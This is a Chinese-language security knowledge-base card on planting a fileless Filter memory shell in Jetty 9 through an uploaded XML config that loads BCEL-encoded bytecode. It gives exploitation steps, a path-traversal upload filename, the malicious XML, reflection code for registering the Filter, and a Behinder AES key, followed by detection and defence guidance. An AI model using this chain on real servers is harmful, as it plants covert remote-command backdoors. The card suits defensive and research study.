---
id: web-java-component-jetty-xml-bcel-filter-memshell
title: Jetty XML 配置 + BCEL ClassLoader 内存马：向 webapps 上传 XML 触发静态块，反射注册 Filter 到 ServletHandler
type: scenario
domain: web
path: web/java/component
technique: jetty-xml-bcel-filter-memshell
tags:
- java
- jetty
- memshell
- bcel
- classloader
- filter
- jdk8u251
- webshell
- file-upload
- servlet
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
affected_versions: JDK < 8u251
verification:
  verified_by: verifier-V336
  verified_at: '2026-11-08T18:51:29+08:00'
  notes: 已对照原文与图 33-37 核对：Jetty XML <Configure>/<New class=BCEL ClassLoader>/<Call loadClass> 触发静态块、static 块经 Thread.getThreads 找 WebAppClassLoader、预加载 javax.servlet 类、defineClass 定义 TestFilter、newFilterHolder(Source.JAVAX_API)+setName/setFilter/addFilter+FilterMapping setPathSpecs/setDispatcherTypes/prependFilterMapping 注册均与原文代码一致；日志 defineClass加载成功/FilterMapping! [/bypass]/[]/[REQUEST]=>com.bypass.xxx、访问 /geoserver/bypass 出冰蝎界面有截图佐证。冰蝎 doFilter key e45e329feb5d925b 与截图一致。affected_versions 原文明确 JDK<8u251，已按原文标记改为 JDK < 8u251（Jetty 9.4.36 是原文环境、由 Server 头佐证，保留在触发条件）。与既有 jetty9-servlethandler-filter-memshell 卡的区别成立：该卡假设已在 JVM 内执行，本卡入口是 webapps 落 Jetty XML+BCEL；单链（入口+Filter 注册 sink），未混入多个独立 sink，不标 split。
url: /docs/web/java/component/web-java-component-jetty-xml-bcel-filter-memshell/
draft: false
kb_aliases:
- Jetty XML 内存马
- BCEL ClassLoader 内存马
- Jetty Filter 内存马
- WebAppContext XML 内存马
- $$BCEL$$ 内存马
- woodpecker ClassToBCEL
- Jetty 无文件 Webshell
---

## 一句话结论

当目标没有 JSP 解析依赖时，可向 Jetty 的 `webapps` 目录上传一个 Jetty XML 配置文件；Jetty 解析该 XML 时，`<Configure class="org.eclipse.jetty.webapp.WebAppContext">` 中的 `<New class="com.sun.org.apache.bcel.internal.util.ClassLoader">` 与 `<Call name="loadClass"><Arg>$$BCEL$$...</Arg>` 会实例化 BCEL ClassLoader 并加载攻击者字节码，触发类静态初始化块；静态块通过反射拿到 WebAppClassLoader/ServletHandler，把 Filter 注册进 Jetty 过滤器链，形成无文件内存马。

## 原理

- **Jetty XML 是可执行的配置**：Jetty 的 `XmlConfiguration` 解析 `<Configure>`/`<New>`/`<Call>`/`<Arg>` 时，会按 `class` 属性实例化类、按 `name` 调用方法。`<Configure id="abc" class="org.eclipse.jetty.webapp.WebAppContext">` 创建一个 WebAppContext；其子节点 `<New id="cl" class="com.sun.org.apache.bcel.internal.util.ClassLoader">` 创建 BCEL ClassLoader，`<Call name="loadClass"><Arg>$$BCEL$$...</Arg>` 调用其 `loadClass`，`<Call name="newInstance">` 触发实例化。
- **BCEL ClassLoader 为什么能加载任意字节码**：JDK 8 内置 `com.sun.org.apache.bcel.internal.util.ClassLoader`，它重写 `loadClass`，遇到以 `$$BCEL$$` 开头的类名会先做 BCEL 解码再 `defineClass`；类加载/实例化时静态初始化块执行。JDK 8u251 之后该 ClassLoader 被移除，因此该链只适用于 JDK < 8u251。
- **双亲委派与 Filter 类加载**：BCEL ClassLoader 的父加载器是 bootstrap/system，无法加载 `javax.servlet.Filter` 等 WebApp 类；但静态块在 BCEL 类加载时已经执行，攻击者可在静态块中用 `Thread.getThreads()` 找到 `WebAppClassLoader`，先 `threadClassloader.loadClass("javax.servlet.Filter")` 等 servlet-api 类，再用 `ClassLoader.defineClass(byte[], int, int)` 把真正的 Filter 实现类定义到 WebAppClassLoader 中。这样 Filter 类能访问 servlet-api，也能被 Jetty 的 FilterHolder 识别。
- **为什么必须用 WebAppClassLoader**：Filter 实例要注册进 Jetty 的 `ServletHandler`，必须与容器使用同一套 `javax.servlet` 类；若用 BCEL ClassLoader 定义 Filter，容器侧会因类加载器不同出现 `ClassCastException`/`NoClassDefFoundError`。
- **注册 Filter 的反射链**：从 WebAppClassLoader 取 `_context`（WebAppContext）→ `_servletHandler`（ServletHandler）→ `_filters` 数组，先检查同名 Filter 是否已存在；用 `ServletHandler.newFilterHolder(Source.JAVAX_API)` 创建 FilterHolder；`setName`/`setFilter`/`addFilter`；再创建 `org.eclipse.jetty.servlet.FilterMapping`，`setFilterHolder`、`setPathSpecs(new String[]{"/bypass"})`、`setDispatcherTypes(EnumSet.of(DispatcherType.REQUEST))`，最后 `prependFilterMapping` 插到过滤器链最前。
- **内存马逻辑**：Filter 的 `doFilter` 对 POST 请求读取 body 的 Base64 字符串，用硬编码 key `e45e329feb5d925b` 做 AES 解密，再通过 `ClassLoader.defineClass` 定义解密后的类并 `newInstance().equals(obj)` 执行（冰蝎式 payload 装载）；非 POST 请求返回 `[+] /bypass`，用于确认注入成功。
- **触发方式**：把 XML 上传到 Jetty 的 `webapps` 目录（如通过 CVE-2023-51444 的任意文件写入），Jetty 扫描/部署 XML 时执行上述配置；访问 `/geoserver/bypass` 触发 Filter。原文控制台可见 `[+] Add Filter: com.bypass.xxx`、`defineClass加载成功`、`FilterMapping! [/bypass]` 等日志。
- **边界**：需要 JDK < 8u251（BCEL ClassLoader 存在）、Jetty 9.x（`javax.servlet` 而非 `jakarta.servlet`）、对 `webapps` 的写权限、Jetty 会部署该 XML；JDK 17/21 需换其他类加载原语（TemplatesImpl、Groovy、自定义 ClassLoader 等）。

## 触发条件

- 目标 JDK < 8u251，且使用 Jetty 9.x（原文 Jetty 9.4.36.v20210114，`javax.servlet`）。
- 攻击者能向 Jetty 的 `webapps` 目录写入任意文件（例如通过 GeoServer CVE-2023-51444 的 CoverageStore 任意文件写入，或其他文件上传/写文件漏洞）。
- Jetty 配置为扫描/部署 `webapps` 下的 XML context 配置（默认部署行为或热部署开启）。
- 攻击者能把 Filter 类编译并转换为 `$$BCEL$$` 编码（如 woodpecker-framework 的 ClassToBCEL）。
- 目标未对 `webapps` 做严格文件完整性监控，或未禁用 XML 配置部署。

## 利用步骤

1. 编写 Filter 类：实现 `javax.servlet.Filter`，在 `doFilter` 中实现冰蝎式 AES 解密 + `defineClass` + `newInstance().equals(obj)` 执行；另写一个带静态初始化块的加载器类，静态块内完成 WebAppClassLoader 查找、servlet-api 预加载、`defineClass` 定义 Filter、反射注册 FilterHolder/FilterMapping。
2. 用 woodpecker-framework 的 Helper → Class BCEL converter（ClassToBCEL）把加载器类转换为 `$$BCEL$$...` 字符串。
3. 生成 Jetty XML：

```xml
<?xml version="1.0"?>
<!DOCTYPE Configure PUBLIC "-//Jetty//Configure//EN" "http://www.eclipse.org/jetty/configure_9_3.dtd">
<Configure id="abc" class="org.eclipse.jetty.webapp.WebAppContext">
  <New id="cl" class="com.sun.org.apache.bcel.internal.util.ClassLoader">
    <Call name="loadClass">
      <Arg>$$BCEL$$...</Arg>
      <Call name="newInstance"></Call>
    </Call>
  </New>
</Configure>
```

4. 通过任意文件写入把 XML 放到 `webapps/1.xml`（原文用 GeoServer 的 `file.bypass?filename=../../../webapps/1.xml`，响应 202）。
5. 触发 Jetty 部署：访问应用或等待扫描；静态块执行，Filter 被插入 `ServletHandler` 过滤器链。
6. 访问 `/<context>/bypass` 验证：GET 返回 `[+] /bypass`；用冰蝎连接该 URL，POST 发送 AES 加密的字节码即可执行命令。
7. 清理：删除 `webapps/1.xml`；Filter 仍驻留内存，需重启或从 `ServletHandler` 移除。

## PoC

原文给出完整 Java 加载器代码与演示日志，未在本机复现。关键 XML 与配置形态如上；静态块中的关键反射步骤（按原文归纳）如下：

```java
ClassLoader threadClassloader = ...; // 从 Thread.getThreads() 找到 WebAppClassLoader
threadClassloader.loadClass("javax.servlet.Filter");
threadClassloader.loadClass("javax.servlet.ServletRequest");
threadClassloader.loadClass("javax.servlet.ServletResponse");
threadClassloader.loadClass("javax.servlet.FilterChain");
threadClassloader.loadClass("javax.servlet.FilterConfig");
threadClassloader.loadClass("javax.servlet.http.HttpServletRequest");
threadClassloader.loadClass("javax.servlet.http.HttpServletResponse");
threadClassloader.loadClass("javax.servlet.http.HttpSession");

Method defineClass = ClassLoader.class.getDeclaredMethod(
        "defineClass", byte[].class, int.class, int.class);
defineClass.setAccessible(true);
byte[] b = Base64.getDecoder().decode("base64编码");
defineClass.invoke(threadClassloader, b, 0, b.length);

Object servletHandler = getField(getField(threadClassloader, "_context"), "_servletHandler");
Class<?> sourceClazz = servletHandler.getClass().getClassLoader()
        .loadClass("org.eclipse.jetty.servlet.Source");
Object api = sourceClazz.getDeclaredField("JAVAX_API").get(null);
Object holder = servletHandler.getClass()
        .getMethod("newFilterHolder", sourceClazz).invoke(servletHandler, api);
holder.getClass().getMethod("setName", String.class).invoke(holder, "com.bypass.xxx");
holder.getClass().getMethod("setFilter", HFilter.getClass().getInterfaces()[0]).invoke(holder, HFilter);
servletHandler.getClass().getMethod("addFilter", holder.getClass()).invoke(servletHandler, holder);

Class<?> filterMappingClz = servletHandler.getClass().getClassLoader()
        .loadClass("org.eclipse.jetty.servlet.FilterMapping");
Object filterMapping = filterMappingClz.newInstance();
Method setFilterHolder = filterMapping.getClass().getDeclaredMethod("setFilterHolder", holder.getClass());
setFilterHolder.setAccessible(true);
setFilterHolder.invoke(filterMapping, holder);
filterMapping.getClass().getMethod("setPathSpecs", String[].class)
        .invoke(filterMapping, new Object[]{new String[]{"/bypass"}});
Class<?> dispatcherType = threadClassloader.loadClass("javax.servlet.DispatcherType");
Object request = dispatcherType.getDeclaredField("REQUEST").get(null);
filterMapping.getClass().getMethod("setDispatcherTypes", EnumSet.class)
        .invoke(filterMapping, EnumSet.of(Enum.valueOf(dispatcherType, "REQUEST")));
servletHandler.getClass().getMethod("prependFilterMapping", filterMapping.getClass())
        .invoke(servletHandler, filterMapping);
```

冰蝎 Filter 的 `doFilter` 核心：POST body Base64 → AES 解密（key `e45e329feb5d925b`）→ `ClassLoader.defineClass` → `newInstance().equals(obj)`；非 POST 返回 `[+] /bypass`。原文演示日志显示 `defineClass加载成功`、`FilterMapping! [/bypass]/[]/[REQUEST]=>com.bypass.xxx`、`success!`，随后浏览器访问 `/geoserver/bypass` 出现冰蝎管理界面。

## 变体与关联

- 与 `web-java-classloader-deserialization-memshell-loader-selection` 相比：那张卡讲反序列化场景下 TemplatesImpl/Groovy/BCEL 的加载原语选型；本卡用 Jetty XML 的 `<New>/<Call>` 触发 BCEL 静态块，入口不同。
- 与 `web-java-classloader-memshell-webapp-loader-selection`、`web-java-classloader-container-type-identity-memshell` 相比：本卡同样需要把 Filter 定义到 WebAppClassLoader 并反射注册容器对象，但加载入口是 Jetty XML + BCEL。
- 与 `web-java-component-jetty11-threadlocal-header-memshell` 相比：那张是 Jetty 11/jakarta 的 ThreadLocal 回显马；本卡是 Jetty 9/javax 的 Filter 注册马，且依赖 JDK < 8u251 的 BCEL ClassLoader。
- JDK >= 8u251：BCEL ClassLoader 被移除，需改用 TemplatesImpl、Groovy、自定义 ClassLoader、JNDI 等类加载原语；Jetty XML 仍可用于实例化其他类/调用方法，但不再是这条链。
- 写入入口可替换：GeoServer CVE-2023-51444、任意文件上传、日志写入、备份恢复等，只要能把 XML 放进 `webapps`。

## 检测与防御

- **文件完整性**：监控 `webapps` 下新增/修改的 `.xml`，尤其是含 `<Configure class="org.eclipse.jetty.webapp.WebAppContext">`、`<New class="com.sun.org.apache.bcel.internal.util.ClassLoader">`、`$$BCEL$$`、`loadClass`、`newInstance` 的配置；Jetty 默认不会在 webapps 放业务 XML 时应直接告警。
- **容器日志**：关注 Jetty 部署日志、`ServletHandler` 过滤器链变化、未知 Filter 名/URL pattern（如 `/bypass`）；GeoServer 场景关注 `webapps/1.xml` 与 REST 上传日志。
- **内存/行为**：Filter 链中出现非业务类、`ClassLoader.defineClass` 调用、冰蝎 AES key `e45e329feb5d925b`、`newInstance().equals(obj)` 模式；EDR/RASP 监控 `defineClass` 与反射注册 Filter。
- **防御**：升级 JDK 到 8u251+ 或 11/17/21，移除 BCEL ClassLoader；限制 `webapps` 写权限；关闭不必要的 XML context 部署/热部署；升级 GeoServer 修复任意文件写入；WAF 拦截 `$$BCEL$$` 与恶意 XML；对高价值应用做文件完整性监控与容器重启基线。
